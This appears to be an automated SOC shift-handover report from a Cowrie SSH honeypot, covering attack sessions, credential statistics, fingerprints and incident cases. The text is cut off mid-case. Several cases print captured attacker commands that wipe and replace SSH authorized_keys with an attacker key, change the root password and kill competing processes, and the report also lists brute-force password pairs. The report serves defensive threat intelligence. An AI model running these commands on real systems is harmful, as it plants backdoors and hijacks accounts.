# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-25 |
| **Generated At** | 2026-05-25T19:46:35Z |
| **Shift Time** | 19:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **101** |
| Confirmed Threats | **91** |
| False Positives Filtered | **10** (9.9%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **10** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **72** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **67** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **19** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 14 |
| `curl` | 4 |
| `cloud` | 3 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `fjbdfdjkdsfs541544AA@@` | 5 |
| `welltech12` | 4 |
| `Wangsu@2017` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `curl` | `welltech12` | 4 |
| `cloud` | `Wangsu@2017` | 3 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `fjbdfdjkdsfs541544@@` | `118.145.225.50` | 2026-05-25T19:03:03 |
| `root` | `3245gs5662d34` | `118.145.225.50` | 2026-05-25T19:03:06 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `45.120.216.232` | 2026-05-25T19:06:03 |
| `root` | `3245gs5662d34` | `45.120.216.232` | 2026-05-25T19:06:07 |
| `root` | `test123$` | `47.82.221.18` | 2026-05-25T19:21:38 |
| `root` | `3245gs5662d34` | `47.82.221.18` | 2026-05-25T19:21:41 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.96.200.56` | 2026-05-25T19:21:55 |
| `root` | `qwaszx123` | `186.31.95.163` | 2026-05-25T19:25:17 |
| `root` | `3245gs5662d34` | `186.31.95.163` | 2026-05-25T19:25:24 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `140.246.137.102` | 2026-05-25T19:28:52 |
| `root` | `3245gs5662d34` | `140.246.137.102` | 2026-05-25T19:28:56 |
| `root` | `admin10` | `140.246.137.102` | 2026-05-25T19:29:39 |
| `root` | `qwaszx123` | `140.246.137.102` | 2026-05-25T19:31:12 |
| `root` | `13579` | `140.246.137.102` | 2026-05-25T19:31:52 |
| `root` | `123asdASD` | `140.246.137.102` | 2026-05-25T19:32:15 |
| `root` | `Bn123456@` | `140.246.137.102` | 2026-05-25T19:32:40 |
| `root` | `aA12345678` | `140.246.137.102` | 2026-05-25T19:33:03 |
| `root` | `zxc123` | `140.246.137.102` | 2026-05-25T19:34:17 |
| `root` | `fjbdfdjkdsfs541544@@` | `140.246.137.102` | 2026-05-25T19:35:47 |
| `root` | `@123456` | `120.48.44.93` | 2026-05-25T19:41:38 |
| `root` | `3245gs5662d34` | `120.48.44.93` | 2026-05-25T19:41:50 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **101** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 83 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 39 | 2 |
| `f555226df196...` | Mirai/variant | 33 | 5 |
| `af8223ac9914...` | libssh-based | 8 | 2 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 39 | 2 | Modern SSH client |
| `f555226df196...` | libssh | 33 | 5 | Mirai/variant |
| `af8223ac9914...` | libssh | 8 | 2 | libssh-based |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:SfrHA3mw68yc"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.96.200.56`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `140.246.137.102`, `118.145.225.50`, `45.120.216.232`, `186.31.95.163`, `47.82.221.18`, `120.48.44.93`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **20** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS137266` | CHINATELECOM Hubei province Wuhan 5G network | 1 | MEDIUM |
| `AS202425` | IP Volume inc | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-aeb109d8123f

| Field | Detail |
|---|---|
| **Source IP** | `118.145.225[.]50` |
| **First Seen** | 2026-05-25 19:03 |
| **Last Seen** | 2026-05-25 19:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:03:02` | `cowrie.session.connect` |
| `2026-05-25 19:03:02` | `cowrie.client.version` |
| `2026-05-25 19:03:03` | `cowrie.client.kex` |
| `2026-05-25 19:03:03` | `cowrie.login.success` |
| `2026-05-25 19:03:03` | `cowrie.session.params` |
| `2026-05-25 19:03:03` | `cowrie.command.input` |
| `2026-05-25 19:03:03` | `cowrie.command.failed` |
| `2026-05-25 19:03:04` | `cowrie.log.closed` |
| `2026-05-25 19:03:04` | `cowrie.session.params` |
| `2026-05-25 19:03:04` | `cowrie.command.input` |
| `2026-05-25 19:03:04` | `cowrie.session.file_download` |
| `2026-05-25 19:03:04` | `cowrie.log.closed` |
| `2026-05-25 19:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.225[.]50` to AbuseIPDB if not already reported
- [ ] Block `118.145.225[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed02c7586431

| Field | Detail |
|---|---|
| **Source IP** | `118.145.225[.]50` |
| **First Seen** | 2026-05-25 19:03 |
| **Last Seen** | 2026-05-25 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:03:06` | `cowrie.session.connect` |
| `2026-05-25 19:03:06` | `cowrie.client.version` |
| `2026-05-25 19:03:06` | `cowrie.client.kex` |
| `2026-05-25 19:03:06` | `cowrie.login.success` |
| `2026-05-25 19:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.225[.]50` to AbuseIPDB if not already reported
- [ ] Block `118.145.225[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b7bdf1e0d8a

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-05-25 19:06 |
| **Last Seen** | 2026-05-25 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:06:02` | `cowrie.session.connect` |
| `2026-05-25 19:06:02` | `cowrie.client.version` |
| `2026-05-25 19:06:02` | `cowrie.client.kex` |
| `2026-05-25 19:06:03` | `cowrie.login.success` |
| `2026-05-25 19:06:03` | `cowrie.session.params` |
| `2026-05-25 19:06:03` | `cowrie.command.input` |
| `2026-05-25 19:06:03` | `cowrie.command.failed` |
| `2026-05-25 19:06:04` | `cowrie.log.closed` |
| `2026-05-25 19:06:04` | `cowrie.session.params` |
| `2026-05-25 19:06:04` | `cowrie.command.input` |
| `2026-05-25 19:06:04` | `cowrie.session.file_download` |
| `2026-05-25 19:06:04` | `cowrie.log.closed` |
| `2026-05-25 19:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d565cd5d2ba6

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-05-25 19:06 |
| **Last Seen** | 2026-05-25 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:06:06` | `cowrie.session.connect` |
| `2026-05-25 19:06:06` | `cowrie.client.version` |
| `2026-05-25 19:06:06` | `cowrie.client.kex` |
| `2026-05-25 19:06:07` | `cowrie.login.success` |
| `2026-05-25 19:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ecad4ef680

| Field | Detail |
|---|---|
| **Source IP** | `101.96.200[.]56` |
| **First Seen** | 2026-05-25 19:21 |
| **Last Seen** | 2026-05-25 19:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SfrHA3mw68yc"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:21:55` | `cowrie.session.connect` |
| `2026-05-25 19:21:55` | `cowrie.client.version` |
| `2026-05-25 19:21:55` | `cowrie.client.kex` |
| `2026-05-25 19:21:55` | `cowrie.login.success` |
| `2026-05-25 19:21:55` | `cowrie.session.params` |
| `2026-05-25 19:21:55` | `cowrie.command.input` |
| `2026-05-25 19:21:55` | `cowrie.command.failed` |
| `2026-05-25 19:21:56` | `cowrie.log.closed` |
| `2026-05-25 19:21:56` | `cowrie.session.params` |
| `2026-05-25 19:21:56` | `cowrie.command.input` |
| `2026-05-25 19:21:56` | `cowrie.session.file_download` |
| `2026-05-25 19:21:56` | `cowrie.log.closed` |
| `2026-05-25 19:22:06` | `cowrie.session.params` |
| `2026-05-25 19:22:06` | `cowrie.command.input` |
| `2026-05-25 19:22:06` | `cowrie.log.closed` |
| `2026-05-25 19:22:06` | `cowrie.session.params` |
| `2026-05-25 19:22:06` | `cowrie.command.input` |
| `2026-05-25 19:22:06` | `cowrie.log.closed` |
| `2026-05-25 19:22:07` | `cowrie.session.params` |
| `2026-05-25 19:22:07` | `cowrie.command.input` |
| `2026-05-25 19:22:07` | `cowrie.session.file_download` |
| `2026-05-25 19:22:07` | `cowrie.log.closed` |
| `2026-05-25 19:22:07` | `cowrie.session.params` |
| `2026-05-25 19:22:07` | `cowrie.command.input` |
| `2026-05-25 19:22:07` | `cowrie.log.closed` |
| `2026-05-25 19:22:07` | `cowrie.session.params` |
| `2026-05-25 19:22:07` | `cowrie.command.input` |
| `2026-05-25 19:22:08` | `cowrie.log.closed` |
| `2026-05-25 19:22:08` | `cowrie.session.params` |
| `2026-05-25 19:22:08` | `cowrie.command.input` |
| `2026-05-25 19:22:08` | `cowrie.command.input` |
| `2026-05-25 19:22:08` | `cowrie.log.closed` |
| `2026-05-25 19:22:08` | `cowrie.session.params` |
| `2026-05-25 19:22:08` | `cowrie.command.input` |
| `2026-05-25 19:22:08` | `cowrie.log.closed` |
| `2026-05-25 19:22:09` | `cowrie.session.params` |
| `2026-05-25 19:22:09` | `cowrie.command.input` |
| `2026-05-25 19:22:09` | `cowrie.log.closed` |
| `2026-05-25 19:22:09` | `cowrie.session.params` |
| `2026-05-25 19:22:09` | `cowrie.command.input` |
| `2026-05-25 19:22:09` | `cowrie.log.closed` |
| `2026-05-25 19:22:09` | `cowrie.session.params` |
| `2026-05-25 19:22:09` | `cowrie.command.input` |
| `2026-05-25 19:22:10` | `cowrie.log.closed` |
| `2026-05-25 19:22:10` | `cowrie.session.params` |
| `2026-05-25 19:22:10` | `cowrie.command.input` |
| `2026-05-25 19:22:10` | `cowrie.log.closed` |
| `2026-05-25 19:22:10` | `cowrie.session.params` |
| `2026-05-25 19:22:10` | `cowrie.command.input` |
| `2026-05-25 19:22:10` | `cowrie.log.closed` |
| `2026-05-25 19:22:11` | `cowrie.session.params` |
| `2026-05-25 19:22:11` | `cowrie.command.input` |
| `2026-05-25 19:22:11` | `cowrie.log.closed` |
| `2026-05-25 19:22:11` | `cowrie.session.params` |
| `2026-05-25 19:22:11` | `cowrie.command.input` |
| `2026-05-25 19:22:11` | `cowrie.log.closed` |
| `2026-05-25 19:22:11` | `cowrie.session.params` |
| `2026-05-25 19:22:11` | `cowrie.command.input` |
| `2026-05-25 19:22:12` | `cowrie.log.closed` |
| `2026-05-25 19:22:12` | `cowrie.session.params` |
| `2026-05-25 19:22:12` | `cowrie.command.input` |
| `2026-05-25 19:22:12` | `cowrie.log.closed` |
| `2026-05-25 19:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.200[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.96.200[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fb92e639cec

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-25 19:25 |
| **Last Seen** | 2026-05-25 19:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:25:16` | `cowrie.session.connect` |
| `2026-05-25 19:25:16` | `cowrie.client.version` |
| `2026-05-25 19:25:16` | `cowrie.client.kex` |
| `2026-05-25 19:25:17` | `cowrie.login.success` |
| `2026-05-25 19:25:18` | `cowrie.session.params` |
| `2026-05-25 19:25:18` | `cowrie.command.input` |
| `2026-05-25 19:25:18` | `cowrie.command.failed` |
| `2026-05-25 19:25:18` | `cowrie.log.closed` |
| `2026-05-25 19:25:19` | `cowrie.session.params` |
| `2026-05-25 19:25:19` | `cowrie.command.input` |
| `2026-05-25 19:25:19` | `cowrie.session.file_download` |
| `2026-05-25 19:25:19` | `cowrie.log.closed` |
| `2026-05-25 19:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152ce8491711

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-25 19:25 |
| **Last Seen** | 2026-05-25 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:25:22` | `cowrie.session.connect` |
| `2026-05-25 19:25:22` | `cowrie.client.version` |
| `2026-05-25 19:25:23` | `cowrie.client.kex` |
| `2026-05-25 19:25:24` | `cowrie.login.success` |
| `2026-05-25 19:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5856d0d8e0e

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:28 |
| **Last Seen** | 2026-05-25 19:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:28:52` | `cowrie.session.connect` |
| `2026-05-25 19:28:52` | `cowrie.client.version` |
| `2026-05-25 19:28:52` | `cowrie.client.kex` |
| `2026-05-25 19:28:52` | `cowrie.login.success` |
| `2026-05-25 19:28:52` | `cowrie.session.params` |
| `2026-05-25 19:28:52` | `cowrie.command.input` |
| `2026-05-25 19:28:52` | `cowrie.command.failed` |
| `2026-05-25 19:28:53` | `cowrie.log.closed` |
| `2026-05-25 19:28:53` | `cowrie.session.params` |
| `2026-05-25 19:28:53` | `cowrie.command.input` |
| `2026-05-25 19:28:53` | `cowrie.session.file_download` |
| `2026-05-25 19:28:53` | `cowrie.log.closed` |
| `2026-05-25 19:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60135247ef4

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:28 |
| **Last Seen** | 2026-05-25 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:28:55` | `cowrie.session.connect` |
| `2026-05-25 19:28:55` | `cowrie.client.version` |
| `2026-05-25 19:28:55` | `cowrie.client.kex` |
| `2026-05-25 19:28:56` | `cowrie.login.success` |
| `2026-05-25 19:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a2975a329c

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:29 |
| **Last Seen** | 2026-05-25 19:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
